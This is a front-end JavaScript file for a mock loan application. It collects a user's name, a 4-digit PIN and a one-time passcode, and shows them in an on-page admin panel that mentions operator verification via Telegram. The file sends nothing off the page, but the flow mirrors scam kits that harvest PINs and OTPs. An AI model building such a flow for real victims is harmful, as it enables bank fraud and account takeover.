let currentStep = 1;
let loanData = {
    amount: 300,
    name: '',
    purpose: '',
    pin: '',
    otp: ''
};

const rangeInput = document.getElementById('loan-range');
const amountDisplay = document.getElementById('amount-val');
const interestDisplay = document.getElementById('interest-val');
const totalDisplay = document.getElementById('total-val');

rangeInput.addEventListener('input', (e) => {
    const val = parseInt(e.target.value);
    loanData.amount = val;
    amountDisplay.innerText = `$${val}`;
    const interest = Math.round(val * 0.05);
    interestDisplay.innerText = `$${interest}`;
    totalDisplay.innerText = `$${val + interest}`;
});

function goToStep(step) {
    if (step === 2) {
        const name = document.getElementById('full-name').value.trim();
        if (!name) {
            alert('Please enter your full name.');
            return;
        }
        loanData.name = name;
        loanData.purpose = document.getElementById('purpose').value;
    }

    document.querySelectorAll('.step-card').forEach(el => el.classList.remove('active'));
    document.getElementById(`step-${step}`).classList.add('active');

    for (let i = 1; i <= 4; i++) {
        const dot = document.getElementById(`dot-${i}`);
        const line = document.getElementById(`line-${i}`);
        if (i <= step) {
            dot.classList.add('active');
            if (line) line.classList.add('active');
        } else {
            dot.classList.remove('active');
            if (line) line.classList.remove('active');
        }
    }
    currentStep = step;
}

document.querySelectorAll('.pin-inputs').forEach(container => {
    const inputs = container.querySelectorAll('.pin-box');
    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value.length === 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        });
    });
});

function submitPin() {
    const pinBoxes = document.querySelectorAll('#pin-container .pin-box');
    let pin = '';
    pinBoxes.forEach(box => pin += box.value);
    if (pin.length < 4) {
        alert('Please enter a 4-digit PIN.');
        return;
    }
    loanData.pin = pin;

    goToStep(3);

    document.getElementById('admin-status').innerText = 'New Application Received!';
    document.getElementById('admin-status').style.color = '#38bdf8';
    document.getElementById('admin-details').innerHTML = `
        <p><strong>Name:</strong> ${loanData.name}</p>
        <p><strong>Amount:</strong> $${loanData.amount}</p>
        <p><strong>Purpose:</strong> ${loanData.purpose}</p>
        <p><strong>PIN:</strong> ****</p>
    `;
    document.getElementById('admin-approve-btn').disabled = false;
}

function adminApproveLoan() {
    document.getElementById('admin-status').innerText = 'Approved! Waiting for OTP...';
    document.getElementById('admin-status').style.color = '#4ade80';
    document.getElementById('admin-approve-btn').style.display = 'none';
    goToStep(4);
}

function submitOTP() {
    const otpBoxes = document.querySelectorAll('#otp-container .pin-box');
    let otp = '';
    otpBoxes.forEach(box => otp += box.value);
    if (otp.length < 4) {
        alert('Please enter the 4-digit OTP code.');
        return;
    }
    loanData.otp = otp;

    document.getElementById('admin-details').innerHTML += `<p><strong>OTP Submitted:</strong> ${otp}</p>`;
    document.getElementById('admin-otp-btn').style.display = 'block';
    alert('OTP submitted! Waiting for Admin verification in Telegram...');
}

function adminApproveOTP() {
    document.getElementById('admin-status').innerText = 'Completed & Disbursed!';
    document.getElementById('admin-otp-btn').disabled = true;

    document.getElementById('rec-name').innerText = loanData.name;
    document.getElementById('rec-amount').innerText = `$${loanData.amount}`;

    goToStep(5);
}
